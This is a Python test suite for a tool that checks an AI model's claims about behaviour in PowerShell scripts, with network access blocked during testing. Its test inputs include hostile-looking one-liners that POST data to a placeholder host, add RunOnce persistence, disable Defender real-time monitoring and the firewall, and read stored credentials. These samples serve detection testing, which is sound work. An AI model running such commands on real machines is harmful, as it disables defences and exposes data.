"""Technical regressions on synthetic text only; no F4, provider or new freezes."""
import base64
from dataclasses import FrozenInstanceError
import hashlib
import json
import socket

import pytest
from fastapi.testclient import TestClient
from pydantic import ValidationError

from app.api.application import create_app
from app.schemas.pipeline import ComparisonResult, PipelineResult
from app.services.deobfuscation.engine import deobfuscate
from app.services.llm.qwen3coder import Qwen3CoderSettings
from app.services.pipelines import evidence_check as ec
from app.services.pipelines.context import sha
from app.services.pipelines.resources import OperationalFailure
from app.services.pipelines.sanitize import sanitize_comments
from app.services.pipelines.strategy import DeterministicLayersStrategy, POLICY_V2_PATH, POLICY_V2_SHA256
from tests.historical_sources import verified_source
from tests.pipelines.test_qwen3coder_v2 import finding, report, service


@pytest.fixture(autouse=True)
def offline(monkeypatch):
    monkeypatch.delenv("PSI_PIPELINE_SETTINGS", raising=False)
    monkeypatch.delenv("PSI_LLM_PROFILE", raising=False)
    monkeypatch.setattr(socket, "create_connection", lambda *a, **k: pytest.fail("Real network forbidden"))


RUN = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"


@pytest.mark.parametrize("code,bid", [
    ('Invoke-RestMethod -Uri "https://example.invalid/x" -Method "Post"', 'B06'),
    ("Invoke-WebRequest -Uri 'https://example.invalid/x' `\n -Method Post -Body $data", 'B06'),
    ("Invoke-WebRequest -Uri 'https://example.invalid/x' `\r\n -Method 'PUT' -Body 'x' -OutFile 'Q:\\r'", 'B06'),
    ("Invoke-WebRequest -Uri 'https://example.invalid/x' -Method Patch -Body 'x'", 'B06'),
    ("Invoke-WebRequest -Uri 'https://example.invalid/x' -OutFile 'Q:\\r'", 'B01'),
    ("Invoke-RestMethod -Uri 'https://example.invalid/x' -Method 'GET'", 'B01'),
    ("(New-Object Net.WebClient).DownloadString('https://example.invalid/x')", 'B01'),
    ("Invoke-Expression 'Get-Process'", 'B02'),
    (f"Set-ItemProperty -Path '{RUN}' -Name Agent -Value 'Q:\\agent.ps1'", 'B03'),
    ('Set-MpPreference -DisableRealtimeMonitoring $true', 'B04'),
    ("Add-MpPreference -ExclusionPath 'Q:\\cache'", 'B04'),
    ('Set-NetFirewallProfile -Profile Private -Enabled $false', 'B04'),
    ('Get-Process', 'B05'),
    (f"Get-ItemProperty -Path '{RUN}'", 'B05'),
    ("Test-NetConnection -ComputerName 'example.invalid' -Port 443", 'B06'),
    ("Get-StoredCredential -Target 'academic-test'", 'B07'),
])
def test_complete_operations_have_bounded_support_and_publicable_spans(tmp_path, code, bid):
    svc, _ = service(tmp_path, report([finding(bid, code)]))
    result = svc.analyze(code, 'B')
    assert result.status == 'completed' and [f.behavior_id.value for f in result.llm.behaviors] == [bid]
    decision = result.operational['evidence_check']['decisions'][0]
    assert decision['action'] == 'kept' and decision['support'] == 'bounded_static_pattern'
    assert decision['human_validated'] is False
    for citation in decision['citations']:
        assert citation['snippet'] == code[citation['start']:citation['end']]
        for op in citation['operations']:
            assert citation['start'] <= op['start'] < op['end'] <= citation['end']
            assert op['snippet'] == code[op['start']:op['end']]
            assert op['rule_id'] and op['conditions'] and op['limitations']
    assert PipelineResult.model_validate_json(result.model_dump_json()) == result


PAYLOAD = base64.b64encode(b'Set-MpPreference -DisableRealtimeMonitoring $true').decode()
COMMENT = base64.b64encode(b'# Set-MpPreference').decode()


@pytest.mark.parametrize("code,bid", [
    (f"$bytes = [Convert]::FromBase64String('{PAYLOAD}')", 'B04'),
    (f"$bytes = [Convert]::FromBase64String('{COMMENT}')", 'B04'),
    (f'Write-Output "FromBase64String(\'{PAYLOAD}\')"', 'B04'),
    ('Write-Output "Set-MpPreference"', 'B04'),
    ('$s = @"\n"Get-Process"\n"@', 'B05'),
    ("$s = @'\nGet-Process\n'@", 'B05'),
    ('$sb = [scriptblock]::Create($text)', 'B02'),
    ('$sb = { Set-MpPreference -DisableRealtimeMonitoring $true }', 'B04'),
    ('if ($false) { Get-Process }', 'B05'),
    ('function Uncalled { Get-Process }', 'B05'),
    ('auditpol /get /category:*', 'B04'),
    ('Set-MpPreference -DisableRealtimeMonitoring $false', 'B04'),
    ('Set-NetFirewallProfile -Enabled $true', 'B04'),
    ("Set-Content -Path 'Q:\\notes.txt' -Value 'example \\RunOnce'", 'B03'),
    (f"Get-ItemProperty -Path '{RUN}'", 'B03'),
    ('Get-Content ($env:USERNAME + ".txt")', 'B05'),
    ('Write-Output "Get-ChildItem HKLM"', 'B05'),
    ('Write-Output Get-Process', 'B05'),
    ('Get-Content "Q:\\notes.txt"; Write-Output "password"', 'B07'),
    ('$credential = Get-Credential; $handler.Credentials = $credential.GetNetworkCredential()', 'B07'),
    ("Invoke-WebRequest -Uri 'file:///Q:/notes.txt'", 'B01'),
    ("Invoke-WebRequest -Uri $unknown -Method Get", 'B01'),
    ("Invoke-WebRequest -Uri 'https://example.invalid' -Method $unknown", 'B01'),
    ("Invoke-WebRequest -Uri 'https://example.invalid' -Method Get -Method Post", 'B01'),
    ("Start-BitsTransfer -Source 'https://example.invalid' -Destination 'Q:\\a'", 'B01'),
    ('$entry.RetrievePassword()', 'B07'),
    ('Set-Alias Get-Process Write-Output; Get-Process', 'B05'),
    ("Invoke-Expression 'Set-Alias Get-Process Write-Output'; Get-Process", 'B05'),
    ("& 'Get-Process'", 'B02'),
    (". 'Q:\\unknown.ps1'; Get-Process", 'B05'),
    ("Write-Output x | . 'Q:\\unknown.ps1'; Get-Process", 'B05'),
    ("Invoke-Expression '# Get-Process'", 'B02'),
    ("Invoke-Expression '\"Get-Process\"'", 'B02'),
    ("Invoke-Expression 'return; Get-Process'", 'B02'),
    ("Invoke-Expression 'Write-Output x; return'", 'B02'),
])
def test_textual_or_unproven_operations_are_excluded_with_raw_report_preserved(tmp_path, code, bid):
    answer = report([finding(bid, code)])
    svc, _ = service(tmp_path, answer)
    result = svc.analyze(code, 'B')
    assert result.status == 'completed' and result.llm.behaviors == [] and result.evidence == []
    assert result.operational['model_report_before_evidence_check'] == answer
    assert json.loads(result.operational['response']['message']['content']) == answer
    decision = result.operational['evidence_check']['decisions'][0]
    assert decision['action'] == 'dropped' and decision['to'] is None
    assert decision['support'] == 'unverified' and decision['reason']
    assert result.risk_label.value == answer['risk_label']
    assert any('descartad' in s for s in result.limitations)


@pytest.mark.parametrize("script,snippet", [
    ("Write-Output 'marker'; Get-Process", "'marker'"),
    ('# unique marker\nGet-Process\n', '# unique marker\n'),
    ('# unique marker\r\nGet-Process\r\n', '# unique marker\r\n'),
    ("Invoke-RestMethod -Uri 'https://example.invalid' -Method Post", "Invoke-RestMethod -Uri 'https://example.invalid'"),
    ("Write-Output 'Get-Process -Name marker'; Get-Service", 'Get-Process -Name marker'),
])
def test_citations_are_not_parsed_in_isolation_or_expanded_to_neighbors(tmp_path, script, snippet):
    svc, _ = service(tmp_path, report([finding('B05', snippet)]))
    result = svc.analyze(script, 'B')
    assert result.status == 'completed' and result.llm.behaviors == []
    citation = result.operational['evidence_check']['decisions'][0]['citations'][0]
    assert citation['snippet'] == snippet and citation['operations'] == []
    assert script[citation['start']:citation['end']] == snippet


def test_correct_http_claim_kept_but_wrong_id_never_relabelled(tmp_path):
    code = 'Invoke-RestMethod -Uri "https://example.invalid/x" -Method "Post"'
    svc, _ = service(tmp_path, report([finding('B01', code)]))
    result = svc.analyze(code, 'B')
    assert result.llm.behaviors == []
    assert result.operational['model_behaviors_before_evidence_check'][0]['behavior_id'] == 'B01'
    assert result.operational['evidence_check']['final_behavior_ids'] == []


def test_all_citations_must_support_retained_claim(tmp_path):
    code = "Get-Process; Write-Output 'marker'"
    f = finding('B05', 'Get-Process')
    f['evidence'].append({'source_id': 'original', 'snippet': "'marker'"})
    svc, _ = service(tmp_path, report([f]))
    result = svc.analyze(code, 'B')
    assert result.llm.behaviors == []
    assert [bool(c['operations']) for c in result.operational['evidence_check']['decisions'][0]['citations']] == [True, False]


def test_recovered_string_does_not_establish_functional_invocation(tmp_path):
    code = "$s='Get-' + 'Process'; Write-Output $s"
    recovery = deobfuscate(code)
    step = next(t for t in recovery.transformations if t.recovered_text == 'Get-Process')
    svc, _ = service(tmp_path, report([finding('B05', 'Get-Process', step.transformation_id)]))
    result = svc.analyze(code, 'C')
    assert result.status == 'completed' and not result.llm.behaviors
    citation = result.operational['evidence_check']['decisions'][0]['citations'][0]
    assert citation['source_id'] == step.transformation_id and 'invocation' in citation['reason']


def test_incoherent_risk_retains_all_decisions_candidate_and_raw(tmp_path):
    code = 'Get-Process; Get-Credential'
    answer = report([finding('B05', 'Get-Process'), finding('B07', 'Get-Credential')], risk='high_risk')
    svc, _ = service(tmp_path, answer)
    result = svc.analyze(code, 'B')
    assert result.status == 'error' and result.errors[0].code == 'evidence_check_incoherent'
    assert result.llm is None and result.evidence == [] and result.risk_label.value == 'unknown'
    trace = result.operational['evidence_check']
    assert trace['status'] == 'rejected_incoherent' and trace['candidate_behavior_ids'] == ['B05']
    assert [d['action'] for d in trace['decisions']] == ['kept', 'dropped']
    assert trace['risk_preserved_from_model'] == 'high_risk' and trace['error']
    assert result.operational['model_report_before_evidence_check'] == answer
    assert json.loads(result.operational['response']['message']['content']) == answer
    assert PipelineResult.model_validate_json(result.model_dump_json()) == result


@pytest.mark.parametrize('ending', ['\n', '\r\n'])
def test_policy_is_immutable_snapshot_and_hashes_describe_effective_content(tmp_path, ending):
    text = POLICY_V2_PATH.read_text(encoding='utf8')
    raw = text.replace('\n', ending).encode('utf8')
    path = tmp_path / 'policy.md'; path.write_bytes(raw)
    strategy = DeterministicLayersStrategy(path)
    path.write_text('changed after construction', encoding='utf8')
    context = strategy.build_context('Get-Process', None)
    assert context.messages[0]['content'] == text
    assert context.prompt_sha256 == strategy.policy_sha256 == POLICY_V2_SHA256
    assert strategy.policy_bytes_sha256 == hashlib.sha256(raw).hexdigest()
    with pytest.raises(FrozenInstanceError):
        strategy.policy_text = 'changed in memory'


@pytest.mark.parametrize('port', [1, 1234, 11435, 65535, '11434'])
def test_port_must_match_fixed_loopback_transport(port):
    with pytest.raises(ValidationError):
        Qwen3CoderSettings(port=port)


@pytest.mark.parametrize('text', [
    '# \u00f1\U0001f600\r\nGet-Process # tail\r\n',
    'Get-Process; <# \u00f1\n block #> Get-Service',
    "$s='no # comment'; Get-Process # tail",
    '$s="escaped `" # string"; Get-Process # tail',
    '$s=@"\r\n# here \u00f1\U0001f600\r\n"@\r\nGet-Process # tail',
    "$s=@'\n<# here #>\n'@\nGet-Service # tail",
    '$s="$(Get-Date) # opaque"\nGet-Process # retained',
    'Write-Output --% # opaque\nGet-Process # retained',
    'Get-`Process # opaque',
    '<# unterminated comment',
])
def test_sanitization_preserves_coordinates_strings_and_uncertain_regions(text):
    result = sanitize_comments(text)
    assert len(result.text) == len(text)
    assert [(i, c) for i, c in enumerate(text) if c in '\r\n'] == [(i, c) for i, c in enumerate(result.text) if c in '\r\n']
    assert all(a == b or any(start <= i < end for start, end in result.spans)
               for i, (a, b) in enumerate(zip(text, result.text)))
    for issue in result.diagnostics:
        if issue['fatal']:
            assert result.text[issue['start']:issue['end']] == text[issue['start']:issue['end']]
    if 'opaque' in text or 'unterminated' in text:
        assert result.diagnostics and result.text == text


def test_sanitization_diagnostics_are_retained_when_provider_unavailable(tmp_path):
    svc, server = service(tmp_path, report([]))
    server.json = lambda *a, **k: (_ for _ in ()).throw(OperationalFailure('model_missing', 'simulated'))
    result = svc.analyze('Write-Output --% # retained', 'B')
    assert result.status == 'unavailable'
    assert result.operational['preprocessing']['sources'][0]['diagnostics']
    assert any('Sanitizacion parcial' in s for s in result.limitations)
    assert result.operational['policy_integrity']['text_sha256'] == POLICY_V2_SHA256


@pytest.mark.parametrize('condition,code', [
    ('memory', 'insufficient_memory'), ('missing', 'model_missing'),
    ('digest', 'digest_mismatch'), ('other_resident', 'other_model_loaded'),
    ('blocked', 'inference_interrupted'), ('monitor', 'resource_monitor_unavailable'),
])
def test_qwen3_unavailable_states_never_dispatch_or_fallback(tmp_path, condition, code):
    svc, server = service(tmp_path, report([]))
    if condition == 'memory':
        svc.adapter.sampler = lambda: {'available_bytes': 1, 'commit_available_bytes': 1}
    elif condition == 'other_resident':
        server.residents = [{'digest': '0' * 64}]
    elif condition == 'blocked':
        svc.adapter.gate_factory().marker.write_text('{}', encoding='utf8')
    elif condition == 'monitor':
        def fail():
            raise OSError('SIMULATED monitor failure')
        svc.adapter.sampler = fail
    else:
        original = server.json
        def tags(endpoint, payload=None):
            if endpoint == 'tags':
                return {'models': [] if condition == 'missing' else [
                    {'name': svc.settings.model, 'digest': '0' * 64}]}
            return original(endpoint, payload)
        server.json = tags
    result = svc.analyze('Get-Process', 'B')
    assert result.status == 'unavailable' and result.errors[0].code == code
    assert result.llm is None and result.evidence == []
    assert not any(e == 'chat' for e, _ in server.calls)
    assert result.operational['policy_integrity']['text_sha256'] == POLICY_V2_SHA256


def test_qwen3_interrupted_dispatch_preserves_record_and_never_retries(tmp_path):
    svc, server = service(tmp_path, report([]))
    original = server.json
    def timeout(endpoint, payload=None):
        if endpoint == 'chat':
            server.calls.append((endpoint, payload))
            raise OperationalFailure('timeout', 'SIMULATED timeout')
        return original(endpoint, payload)
    server.json = timeout
    first = svc.analyze('Get-Process', 'B')
    assert first.status == 'error' and first.errors[0].code == 'timeout'
    assert first.operational['inference_dispatched'] and first.operational['circuit_blocked']
    second = svc.analyze('Get-Process', 'C')
    assert second.status == 'unavailable' and second.errors[0].code == 'inference_interrupted'
    assert sum(e == 'chat' for e, _ in server.calls) == 1
    assert first.operational['request']['model'] == svc.settings.model


def test_abc_http_and_roundtrip_share_profile_without_provider_for_a(tmp_path):
    svc, server = service(tmp_path, report([]))
    script = "# ignored comment\n$s='Get-' + 'Process'; Write-Output $s"
    with TestClient(create_app(service=svc), base_url='http://127.0.0.1') as client:
        a = client.post('/api/analyze/A', json={'script': 'Get-Process'}).json()
        assert a['status'] == 'completed' and a['deterministic']['behaviors'] == ['B05']
        assert server.calls == []
        response = client.post('/api/compare', json={'script': script})
    result = ComparisonResult.model_validate_json(response.text)
    assert [r.configuration for r in result.results] == ['A', 'B', 'C']
    b, c = [p for endpoint, p in server.calls if endpoint == 'chat']
    assert {k: v for k, v in b.items() if k != 'messages'} == {k: v for k, v in c.items() if k != 'messages'}
    assert b['messages'][0] == c['messages'][0]
    bu, cu = [json.loads(p['messages'][1]['content']) for p in (b, c)]
    assert set(bu) == {'original'} and set(cu) == {'original', 'deterministic_recovery'}
    assert bu['original'] == cu['original'] and result.results[1].original == script
    assert all('behaviors' not in t for t in cu['deterministic_recovery']['verified_texts'])
    assert result.results[1].engine_versions['postcheck'] == result.results[2].engine_versions['postcheck']


def test_historical_source_lookup_requires_complete_original_hash(tmp_path):
    name = 'backend/app/example.py'
    live = tmp_path / name; live.parent.mkdir(parents=True); live.write_bytes(b'current')
    archived = tmp_path / 'artifacts/qwen14_exploratory_adoption/diagnostic_source_archive' / name
    archived.parent.mkdir(parents=True); archived.write_bytes(b'historical')
    digest = hashlib.sha256(b'historical').hexdigest()
    assert verified_source(tmp_path, name, digest) == archived.resolve()
    archived.write_bytes(b'corrupt')
    with pytest.raises(FileNotFoundError, match=digest):
        verified_source(tmp_path, name, digest)
    with pytest.raises(ValueError):
        verified_source(tmp_path, name, digest[:12])
